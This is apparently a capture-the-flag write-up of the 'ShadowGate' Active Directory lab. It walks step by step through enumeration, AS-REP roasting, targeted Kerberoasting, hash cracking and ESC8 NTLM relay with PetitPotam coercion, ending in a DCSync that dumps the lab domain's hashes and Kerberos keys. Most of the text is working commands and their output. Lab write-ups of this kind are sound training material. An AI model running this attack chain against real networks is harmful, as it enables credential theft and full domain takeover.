---
title: "Shadowagte @ Hacksmater"
date: 2026-06-12
categories: [AD, Easy]
tags: [AD, kerberoasting, asreproasting, ADCS]
image:
  path:/assets/shadowgate.png
---


# Objective

**ShadowGate** recently completed a corporate acquisition that significantly expanded its internal network, user base, and application footprint. Several business-critical systems were migrated and consolidated under tight operational deadlines to minimize downtime and maintain service continuity.

While functional validation was completed, the organization deferred a comprehensive security assessment due to delivery pressure and staffing constraints. Leadership has since requested an independent penetration test to validate the security posture of the newly created environment and identify any material risk before the next audit cycle.

The assessment will evaluate whether a motivated attacker with standard network access could compromise sensitive systems, escalate privileges, or move laterally within the enterprise environment.

The Hack Smarter team has been authorized to perform a black box internal penetration test against the ShadowGate environment.

## Initial Access

The client has provided you with VPN access to their internal network, but no credentials.

### **Open Ports**

```bash
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-15 13:41:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
```

# Eunmeration

## SMB ENUMERATION

```bash
pwn:~>smbclient -L //10.1.122.195 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```

smbclient hit dead ends. I then try `enum4linux` 

```bash
pwn:~> enum4linux 10.1.122.195
"my" variable $which_output masks earlier declaration in same scope at ./enum4linux.pl line 280.
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Oct 17 08:45:47 2026

 =========================================( Target Information )=========================================

Target ........... 10.1.122.195
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

```

`enum4linux` gives usernames

```bash
 =======================================( Users on 10.1.122.195 )=======================================

index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0xff6 RID: 0x45c acb: 0x00000210 Account: amoss	Name: Angela Moss	Desc: (null)
index: 0xfe9 RID: 0x44f acb: 0x00000210 Account: ATHENA	Name: ATHENA	Desc: (null)
index: 0xfef RID: 0x455 acb: 0x00000210 Account: bbrown	Name: Bob Brown	Desc: (null)
index: 0xff3 RID: 0x459 acb: 0x00000210 Account: clocke	Name: Caroline Locke	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xff5 RID: 0x45b acb: 0x00000210 Account: jbradford	Name: John Bradford	Desc: (null)
index: 0xff2 RID: 0x458 acb: 0x00000210 Account: jsmith	Name: John Smith	Desc: (null)
index: 0xff0 RID: 0x456 acb: 0x00010210 Account: jtrueblood	Name: James Trueblood	Desc: (null)
index: 0xf10 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0xfea RID: 0x450 acb: 0x00000210 Account: mbrownlee	Name: Marcel Brownlee	Desc: (null)
index: 0xff4 RID: 0x45a acb: 0x00000210 Account: tclarke	Name: Todd Clarke	Desc: (null)
```

## LDAP Enumeration

```bash
pwn:~> ldapsearch -x -H ldap://10.1.122.195 -s base 
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=shadow,DC=gate
ldapServiceName: shadow.gate:dc01$@SHADOW.GATE
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5

```

LDAP anonymous binding is on, we can retrieve username from ldap also but we already have usernames from `enum4linux` 

## Performing AS-REP ROASTING

since I have usernames, I decide to perform as-rep roasting attack to check user with kerberos pre-authentication disable

```bash
pwn:~> nxc ldap 10.1.122.195 -u users.txt -p '' --asreproast as.txt
LDAP        10.1.122.195    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:shadow.gate) (signing:None) (channel binding:Never) 
LDAP        10.1.122.195    389    DC01             [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
LDAP        10.1.122.195    389    DC01             $krb5asrep$23$jtrueblood@SHADOW.GATE:7f9d3b25497e6bda8721aad5bfe3810c$81c750af29a7456a68776f0df0afdf4e2039eed6725d9ac351fbe9c06ed1a788c318405242063d149de6060fbe3be09d233b9ed6cffb038937b45dc4be14e45d9b2fca25ab4904608828151ed65f4298e0377065827fe88e6ed4cf8fbe688a704f759031c73715dc101eea402a84c279b465332b236ca24e74404eac8a7e93fa8e2a7436248ad4d53edbcc183665dabe87e81033c1a84d9ecd39cd4f66f3abfc086b28b2f8e92c554232cb0551569045687e5a2fbc44eb365781510ad32dbceecc202da5696259ae55282c4dfe765db3a4c2b678ae342db0da79efad431aaa62d660f96af4325e8ca157
LDAP        10.1.122.195    389    DC01             [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

User `jtrueblood` have Kerberos pre-authentication disabled and we dump the hash already. we can now crack it

```bash
pwn:~> hashcat -m 18200 as.txt ~/Documents/wordlist/rockyou.txt 
hashcat (v7.1.2) starting

$krb5asrep$23$jtrueblood@SHADOW.GATE:7f9d3b25497e6bda8721aad5bfe3810c$81c750af29a7456a68776f0df0afdf4e2039eed6725d9ac351fbe9c06ed1a788c318405242063d149de6060fbe3be09d233b9ed6cffb038937b45dc4be14e45d9b2fca25ab4904608828151ed65f4298e0377065827fe88e6ed4cf8fbe688a704f759031c73715dc101eea402a84c279b465332b236ca24e74404eac8a7e93fa8e2a7436248ad4d53edbcc183665dabe87e81033c1a84d9ecd39cd4f66f3abfc086b28b2f8e92c554232cb0551569045687e5a2fbc44eb365781510ad32dbceecc202da5696259ae55282c4dfe765db3a4c2b678ae342db0da79efad431aaa62d660f96af4325e8ca157:blood_brothers

```

```bash
jtrueblood:blood_brothers
```

```bash
pwn:~> nxc smb 10.1.122.195 -u jtrueblood -p 'blood_brothers'
SMB         10.1.122.195    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.1.122.195    445    DC01             [+] shadow.gate\jtrueblood:blood_brothers 
pwn:~> nxc smb 10.1.122.195 -u jtrueblood -p 'blood_brothers' --shares
SMB         10.1.122.195    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.1.122.195    445    DC01             [+] shadow.gate\jtrueblood:blood_brothers 
SMB         10.1.122.195    445    DC01             [*] Enumerated shares
SMB         10.1.122.195    445    DC01             Share           Permissions            Remark
SMB         10.1.122.195    445    DC01             -----           -----------            ------
SMB         10.1.122.195    445    DC01             ADMIN$                                 Remote Admin
SMB         10.1.122.195    445    DC01             C$                                     Default share
SMB         10.1.122.195    445    DC01             CertEnroll      READ                   Active Directory Certificate Services share
SMB         10.1.122.195    445    DC01             IPC$            READ                   Remote IPC
SMB         10.1.122.195    445    DC01             NETLOGON        READ                   Logon server share 
SMB         10.1.122.195    445    DC01             SYSVOL          READ                   Logon server share 
pwn:~> smbclient //10.1.122.195/CertEnroll -U jtrueblood
Password for [WORKGROUP\jtrueblood]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Oct 17 08:42:04 2026
  ..                                  D        0  Mon Jan 12 04:00:58 2026
  DC01.shadow.gate_shadow-DC01-CA.crt      A      877  Mon Jan 12 04:00:31 2026
  nsrev_shadow-DC01-CA.asp            A      323  Mon Jan 12 04:00:58 2026
  shadow-DC01-CA+.crl                 A      725  Sat Oct 17 08:42:04 2026
  shadow-DC01-CA.crl                  A      914  Sat Oct 17 08:42:04 2026

		7863807 blocks of size 4096. 3009399 blocks available
smb: \> get DC01.shadow.gate_shadow-DC01-CA.crt 
getting file \DC01.shadow.gate_shadow-DC01-CA.crt of size 877 as DC01.shadow.gate_shadow-DC01-CA.crt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \> get nsrev_shadow-DC01-CA.asp 
getting file \nsrev_shadow-DC01-CA.asp of size 323 as nsrev_shadow-DC01-CA.asp (0.2 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> get shadow-DC01-CA+.crl
getting file \shadow-DC01-CA+.crl of size 725 as shadow-DC01-CA+.crl (0.5 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> get shadow-DC01-CA.crl
getting file \shadow-DC01-CA.crl of size 914 as shadow-DC01-CA.crl (0.6 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> exit

```

Seeing a share that contains certificate hints me to try AD Certificate attack next

## AD CS ATTACK

### Searching vulnerable certificate

```bash
pwn:~> certipy find -u jtrueblood@SHADOW.GATE -p 'blood_brothers' -vulnerable -dc-ip 10.1.122.195
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 0 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 0 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'shadow-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'shadow-DC01-CA'
[*] Checking web enrollment for CA 'shadow-DC01-CA' @ 'DC01.shadow.gate'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20261023013145_Certipy.txt'
[*] Wrote text output to '20261023013145_Certipy.txt'
[*] Saving JSON output to '20261023013145_Certipy.json'
[*] Wrote JSON output to '20261023013145_Certipy.json'
```

```bash
pwn:~> cat 20261023013145_Certipy.txt
Certificate Authorities
  0
    CA Name                             : shadow-DC01-CA
    DNS Name                            : DC01.shadow.gate
    Certificate Subject                 : CN=shadow-DC01-CA, DC=shadow, DC=gate
    Certificate Serial Number           : 749A4BA2BEA3CFBC41ECDFAEE502E46C
    Certificate Validity Start          : 2026-01-12 02:50:31+00:00
    Certificate Validity End            : 2046-01-12 03:00:31+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SHADOW.GATE\Administrators
      Access Rights
        ManageCa                        : SHADOW.GATE\Administrators
                                          SHADOW.GATE\Domain Admins
                                          SHADOW.GATE\Enterprise Admins
        ManageCertificates              : SHADOW.GATE\Administrators
                                          SHADOW.GATE\Domain Admins
                                          SHADOW.GATE\Enterprise Admins
        Enroll                          : SHADOW.GATE\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates

```

Zero Cert template was found:) that wasn’t excepted. I then try to use Bloodhound for further analysis

## Collecting bloodhound data

```bash
pwn:~> nxc ldap 10.1.122.195 -u jtrueblood -p 'blood_brothers' --bloodhound -c All --dns-server 10.1.122.195
LDAP        10.1.122.195    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:shadow.gate) (signing:None) (channel binding:Never) 
LDAP        10.1.122.195    389    DC01             [+] shadow.gate\jtrueblood:blood_brothers 
LDAP        10.1.122.195    389    DC01             Resolved collection methods: acl, adcs, container, dcom, group, localadmin, loggedon, objectprops, psremote, rdp, session, trusts
LDAP        10.1.122.195    389    DC01             Excluded collection methods: 
LDAP        10.1.122.195    389    DC01             Bloodhound data collection completed in 0M 57S
LDAP        10.1.122.195    389    DC01             Collecting ADCS data (CertiHound)...
LDAP        10.1.122.195    389    DC01             Found 0 certificate templates
LDAP        10.1.122.195    389    DC01             Found 1 Enterprise CAs
LDAP        10.1.122.195    389    DC01             Compressing output into /home/d3nul1/.nxc/logs/DC01_10.1.122.195_2026-10-23_015049_bloodhound.zip

```

After collecting the file, I then upload it to Bloodhound 

<img width="1556" height="792" alt="image" src="https://github.com/user-attachments/assets/9bcdbee1-161e-42e5-bb8e-616bc89b030c" />


As seen our current user have a generic write permission over `bbrown`

## Access as `bbrown`

Knowing this, we can set `servicePrincipalName`  for `bbrown`  and request kerberos ticket that we can crack later

```bash
(myenv) pwn:~> bloodyad --host 10.1.122.195 -d shadow.gate -u jtrueblood -p 'blood_brothers' set object bbrown servicePrincipalName
[+] bbrown's servicePrincipalName has been updated
```

OR using `targetedKerberoast.py`

```bash
(myvenv) pwn:~> python3 targetedKerberoast.py -v -d 'shadow.gate' -u 'jtrueblood' -p 'blood_brothers'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (bbrown)
[+] Printing hash for (bbrown)
$krb5tgs$23$*bbrown$SHADOW.GATE$shadow.gate/bbrown*$a65ec649928da053eaf517856196959b$894882ae1e3e3d5ebe9e9334629409b98ce27a1f04fdfb451e52e7b0b8822bae9875f7105fd84c9d9c5e0a0a2fbe452b1c80699c6bf2d4ee26bceb47561a32d348b60f99aee1b30e0f2fa68b591e275e4526d05342dc1525fde017f17c1f794cfeb3785e6e5cf735026d5c0df7c6c0264660b4923071a0d8fdf35741168f29a62e33844ee28864f4fb23d27b4c34fe54cdae1dcd8e9828b4aa371fd7911b6aa08572666cacb3a717fa9887dcbfe01961557d21b94abee8978ee0fd9c62ca2d7bbf3696950caf7d567839306fb6467a56b7040db59b43b383dc2b4c27dff5aec7e4d21d304d4c7ac153fa9168cddab26c2e037d0df6427713cf77f5ffa3aba4140049d9fee9347f51e38c09bab2e29edb1f892d265d3b2602fe0069f20ee70a9a7af56bf1a228512db6e176ba26b4cf3639fa0f31673a68d0987e42c682565acfa56ceda2d629b25462830fe44f8276d4448e15079dee494f1cc886fb085d132b195d07ad2aa5bedece1ab9603eeaa7604322079eac7a88d2e81db01b27ff02aee95c8ad7f641d1d3dfda3a1bef6e7efab72987d4071ff06dfe2487e4691f5b27a36dde0643d86dd9f434625eac71e7b00cd4a2536f68d2e63ff1ef4a7bf6b854a974f2774d6cab9993b01ab58450b47d508572a5aba154f5e47238d0bed23361cfbe0e9305c2183df552b961a0d19bf530bf9e19872452b7e47279be5f710d2e30a5451e6e59f8c401147418befcf2f928be520d480da187b746d60d3828c70825dd368ff20ba082ee2a35e8fdb1dc7d7d2390ff4fa428fe6cd4a10c5d0eb91e5cc745ea0c6c5a917c81d0871a4bffe3bc73e27f09ffdd5ac70777756a2745183f648c9b6b98c11d4e61812ea384589452ead83a5e7cc7e52a9df0beec11cc8f000aa6438a5c1f4f7b88f8157317dd679ebfd9af3f4f65bda56252fd3a1cd967a7bde5f9d3971b0a456b18add9763ab263596fa495cb2f47a7325d63175da5614ad48d83eb8c0c01ecbf6460d07c63fb7e06fabd502b07f38d445ebf6007d97f83f2ba78534932c373179f014579d5a663ca3ba592ef269ccddcd0e5aefc88e4910cbd4ea1a421d4f328c27f38f354b023d1b7d16cc31b35bb38ac73b162f2a63a32dc82f4317745fabe2be5bd45b8b9e6ede04263d648351d7593146d733bfb743db0610d37a179ff3911f1007b35d2d3a3f60d23723ad8bd6567b20cbe397b7a81f4cc83c096c914d5cd7b074b3ffdb9ef93c25bd1cad2132174064a7ba190354b771a8c3b3ca15cbe7d7b7edd7db97b984ec1007baf531e0c6c4933e816ef90f2e13b269446976f5548a997e773d79b7439cc94ca4a0a1d1b995e045f4ac39cb6505502468e2486e76663fac3c9601b0e20817f4af543e39a809bba64e5275d4b6108ad8272c6d696d08ab317da277cf938e0849c57b0572132a09aada4bbd1720b11309c812341192ae04bf341cc303b9a6a1aa50e63a1c0eb01b38af34065a0f83f3f2318814fb9f023752bf5bf944311b707f3
[VERBOSE] SPN removed successfully for (bbrown)

```

We can now crack the hash using hashcat

```bash
(myvenv) pwn:~> hashcat -m 13100 bbrown.hash ~/Documents/wordlist/rockyou.txt 
hashcat (v7.1.2) starting

$krb5tgs$23$*bbrown$SHADOW.GATE$shadow.gate/bbrown*$a65ec649928da053eaf517856196959b$894882ae1e3e3d5ebe9e9334629409b98ce27a1f04fdfb451e52e7b0b8822bae9875f7105fd84c9d9c5e0a0a2fbe452b1c80699c6bf2d4ee26bceb47561a32d348b60f99aee1b30e0f2fa68b591e275e4526d05342dc1525fde017f17c1f794cfeb3785e6e5cf735026d5c0df7c6c0264660b4923071a0d8fdf35741168f29a62e33844ee28864f4fb23d27b4c34fe54cdae1dcd8e9828b4aa371fd7911b6aa08572666cacb3a717fa9887dcbfe01961557d21b94abee8978ee0fd9c62ca2d7bbf3696950caf7d567839306fb6467a56b7040db59b43b383dc2b4c27dff5aec7e4d21d304d4c7ac153fa9168cddab26c2e037d0df6427713cf77f5ffa3aba4140049d9fee9347f51e38c09bab2e29edb1f892d265d3b2602fe0069f20ee70a9a7af56bf1a228512db6e176ba26b4cf3639fa0f31673a68d0987e42c682565acfa56ceda2d629b25462830fe44f8276d4448e15079dee494f1cc886fb085d132b195d07ad2aa5bedece1ab9603eeaa7604322079eac7a88d2e81db01b27ff02aee95c8ad7f641d1d3dfda3a1bef6e7efab72987d4071ff06dfe2487e4691f5b27a36dde0643d86dd9f434625eac71e7b00cd4a2536f68d2e63ff1ef4a7bf6b854a974f2774d6cab9993b01ab58450b47d508572a5aba154f5e47238d0bed23361cfbe0e9305c2183df552b961a0d19bf530bf9e19872452b7e47279be5f710d2e30a5451e6e59f8c401147418befcf2f928be520d480da187b746d60d3828c70825dd368ff20ba082ee2a35e8fdb1dc7d7d2390ff4fa428fe6cd4a10c5d0eb91e5cc745ea0c6c5a917c81d0871a4bffe3bc73e27f09ffdd5ac70777756a2745183f648c9b6b98c11d4e61812ea384589452ead83a5e7cc7e52a9df0beec11cc8f000aa6438a5c1f4f7b88f8157317dd679ebfd9af3f4f65bda56252fd3a1cd967a7bde5f9d3971b0a456b18add9763ab263596fa495cb2f47a7325d63175da5614ad48d83eb8c0c01ecbf6460d07c63fb7e06fabd502b07f38d445ebf6007d97f83f2ba78534932c373179f014579d5a663ca3ba592ef269ccddcd0e5aefc88e4910cbd4ea1a421d4f328c27f38f354b023d1b7d16cc31b35bb38ac73b162f2a63a32dc82f4317745fabe2be5bd45b8b9e6ede04263d648351d7593146d733bfb743db0610d37a179ff3911f1007b35d2d3a3f60d23723ad8bd6567b20cbe397b7a81f4cc83c096c914d5cd7b074b3ffdb9ef93c25bd1cad2132174064a7ba190354b771a8c3b3ca15cbe7d7b7edd7db97b984ec1007baf531e0c6c4933e816ef90f2e13b269446976f5548a997e773d79b7439cc94ca4a0a1d1b995e045f4ac39cb6505502468e2486e76663fac3c9601b0e20817f4af543e39a809bba64e5275d4b6108ad8272c6d696d08ab317da277cf938e0849c57b0572132a09aada4bbd1720b11309c812341192ae04bf341cc303b9a6a1aa50e63a1c0eb01b38af34065a0f83f3f2318814fb9f023752bf5bf944311b707f3:12345678

```

Hash was cracked too

```bash
bbrown:12345678
```

I then confirm the creds

```bash
pwn:~> nxc smb 10.1.122.195 -u bbrown -p 12345678
SMB         10.1.122.195    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.1.122.195    445    DC01             [+] shadow.gate\bbrown:12345678
```

I then went back to try AD CS

## AD CS attack as `bbrown`

```bash
certipy find -u bbrown@SHADOW.GATE -p '12345678' -vulnerable -dc-ip 10.1.122.195
```

```bash
(myenv) pwn:~> cat 20261101230031_Certipy.txt
Certificate Authorities
  0
    CA Name                             : shadow-DC01-CA
    DNS Name                            : DC01.shadow.gate
    Certificate Subject                 : CN=shadow-DC01-CA, DC=shadow, DC=gate
    Certificate Serial Number           : 749A4BA2BEA3CFBC41ECDFAEE502E46C
    Certificate Validity Start          : 2026-01-12 02:50:31+00:00
    Certificate Validity End            : 2046-01-12 03:00:31+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SHADOW.GATE\Administrators
      Access Rights
        ManageCa                        : SHADOW.GATE\Administrators
                                          SHADOW.GATE\Domain Admins
                                          SHADOW.GATE\Enterprise Admins
        ManageCertificates              : SHADOW.GATE\Administrators
                                          SHADOW.GATE\Domain Admins
                                          SHADOW.GATE\Enterprise Admins
        Enroll                          : SHADOW.GATE\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates

```

Notice we have `ESC8`, now we have to locate certificate template with DC enrollment

```bash
certipy find -u bbrown@SHADOW.GATE -p '12345678' -dc-ip 10.1.122.195
```

```bash
    Template Name                       : DomainController
    Display Name                        : Domain Controller
    Certificate Authorities             : shadow-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDirectoryGuid
                                          SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-01-12T03:00:32+00:00
    Template Last Modified              : 2026-01-15T01:57:45+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SHADOW.GATE\Enterprise Read-only Domain Controllers
                                          SHADOW.GATE\Domain Admins
                                          SHADOW.GATE\Domain Controllers
                                          SHADOW.GATE\Enterprise Admins
                                          SHADOW.GATE\Enterprise Domain Controllers
      Object Control Permissions

```

Notice Domain controllers have Enrollment Rights in the template `DomainController`

## ESC8 Exploitation

### Setup NTLM relay listener

```bash
(certipy-venv) root@d3nul1:/home/d3nul1/Documents/hsm/shadowgate# certipy relay -target http://10.1.122.195 -template DomainController
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting http://10.1.122.195/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445

```

### **Coerce Authentication from the Target**

```bash
(myvenv) pwn:~> python3 ~/Desktop/windowhacktoool/PetitPotam/PetitPotam.py -u bbrown -p 12345678 10.200.108.110 10.1.122.195
[-] Connecting to ncacn_np:10.1.122.195[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!

```

After some secs we got back .pfx file

```bash
[*] Targeting http://10.1.122.195/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
[*] (SMB): Received connection from 10.1.122.195, attacking target http://10.1.122.195
[*] HTTP Request: GET http://10.1.122.195/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://10.1.122.195/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://10.1.122.195/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] (SMB): Authenticating connection from /@10.1.122.195 against http://10.1.122.195 SUCCEED [1]
[*] Requesting certificate for '\\' based on the template 'DomainController'
[*] http:///@10.1.122.195 [1] -> HTTP Request: POST http://10.1.122.195/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] Certificate issued with request ID 3
[*] Retrieving certificate for request ID: 3
[*] (SMB): Received connection from 10.1.122.195, attacking target http://10.1.122.195
[*] http:///@10.1.122.195 [1] -> HTTP Request: GET http://10.1.122.195/certsrv/certnew.cer?ReqID=3 "HTTP/1.1 200 OK"
[*] Got certificate with DNS Host Name 'DC01.shadow.gate'
[*] Certificate object SID is 'S-1-5-21-243493930-1113464705-3012771586-1000'
[*] Saving certificate and private key to 'dc01.pfx'
[*] Wrote certificate and private key to 'dc01.pfx'
[*] Exiting...
```

### Authenticate using the file

```bash
(certipy-venv) root@d3nul1:/home/d3nul1/Documents/hsm/shadowgate# certipy auth -pfx dc01.pfx -dc-ip 10.1.122.195

Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC01.shadow.gate'
[*]     Security Extension SID: 'S-1-5-21-243493930-1113464705-3012771586-1000'
[*] Using principal: 'dc01$@shadow.gate'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc01.ccache'
[*] Wrote credential cache to 'dc01.ccache'
[*] Trying to retrieve NT hash for 'dc01$'
[*] Got hash for 'dc01$@shadow.gate': aad3b435b51404eeaad3b435b51404ee:b10d9b50d7823ae2e34d38f8968ff5aa

```

## DCSync

```bash
**(myenv) pwn:~> impacket.secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:b10d9b50d7823ae2e34d38f8968ff5aa 'dc01$@DC01.shadow.gate' -dc-ip 10.1.122.195
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b5509cbfe52e94940c0ec99b21e09802:::
shadow.gate\ATHENA:1103:aad3b435b51404eeaad3b435b51404ee:3215f4c7c852647c88694ab0b57daaba:::
shadow.gate\mbrownlee:1104:aad3b435b51404eeaad3b435b51404ee:6f16868319543175e7f3e6d4eea9adfb:::
shadow.gate\bbrown:1109:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::
shadow.gate\jtrueblood:1110:aad3b435b51404eeaad3b435b51404ee:27e133a345b980d24e3a60f169f2cb7e:::
shadow.gate\jsmith:1112:aad3b435b51404eeaad3b435b51404ee:be0b6d125a6645747d91d30ed3bef98f:::
shadow.gate\clocke:1113:aad3b435b51404eeaad3b435b51404ee:ff506444e2c59b0241812e8e17b0f05e:::
shadow.gate\tclarke:1114:aad3b435b51404eeaad3b435b51404ee:9290a555713c7db0cf7fbf0ac28c1100:::
shadow.gate\jbradford:1115:aad3b435b51404eeaad3b435b51404ee:f5c86043de2a116c6458f3de9aad89de:::
shadow.gate\amoss:1116:aad3b435b51404eeaad3b435b51404ee:381480af4a988ad46758c2f79ee64090:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b10d9b50d7823ae2e34d38f8968ff5aa:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:6bf0048464b8fdf7a2db10f4799715a0c6471ac724424007e95bf55cd6841445
Administrator:aes128-cts-hmac-sha1-96:01b16cb25c0593a4da06b92dcd454c2f
Administrator:des-cbc-md5:d6da94c1b5761f45
krbtgt:aes256-cts-hmac-sha1-96:9d2c8f2fecd0d6813cde513680b594210cf9c91bc2d4f6715ce25972b6a7c7c5
krbtgt:aes128-cts-hmac-sha1-96:03ed2c0be5231fb6bd698d2bc18b9e39
krbtgt:des-cbc-md5:4a5286207f83ae7c
shadow.gate\ATHENA:aes256-cts-hmac-sha1-96:133c566ee74c769acbe2ed903383ebb721ed068c4dd0eef66fb1b0903c47c383
shadow.gate\ATHENA:aes128-cts-hmac-sha1-96:fe90309b458fb3c871d1e71bab58e47b
shadow.gate\ATHENA:des-cbc-md5:e5d6915ee9a2e09e
shadow.gate\mbrownlee:aes256-cts-hmac-sha1-96:15298afcd4a48b82446a25a4fb0dcc79759d29035eaf185a2f7dc55717792f32
shadow.gate\mbrownlee:aes128-cts-hmac-sha1-96:8a62a664980f32985c2093fde8fa5085
shadow.gate\mbrownlee:des-cbc-md5:9de9ef02b008527f
shadow.gate\bbrown:aes256-cts-hmac-sha1-96:c0147f35c874bb289bd827e02787c587a0e975561659c1eb32238505044f9026
shadow.gate\bbrown:aes128-cts-hmac-sha1-96:977d546c11489221d0601de2f48b6a2d
shadow.gate\bbrown:des-cbc-md5:924929ba3efe1343
shadow.gate\jtrueblood:aes256-cts-hmac-sha1-96:2babc2cf18a6871b671c62fb2a4836ec2e1ce5590c18148986228929d44f9030
